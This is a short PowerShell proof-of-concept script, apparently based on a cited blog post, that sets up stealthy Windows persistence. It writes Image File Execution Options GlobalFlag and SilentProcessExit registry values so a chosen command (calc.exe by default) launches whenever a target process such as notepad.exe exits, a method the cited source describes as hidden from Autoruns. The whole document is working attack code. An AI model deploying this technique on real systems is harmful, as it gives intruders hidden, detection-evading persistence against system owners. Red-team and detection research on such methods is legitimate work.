# https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/

param
(
   [string] $terminated_process = "notepad.exe",
   [string] $Command = "c:\windows\system32\calc.exe"
)

reg.exe add ("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + $terminated_process) /v GlobalFlag /t REG_DWORD /d 512 > $null
reg.exe add ("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\" + $terminated_process) /v ReportingMode /t REG_DWORD /d 1 > $null
reg.exe add ("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\" + $terminated_process) /v MonitorProcess /d $Command > $null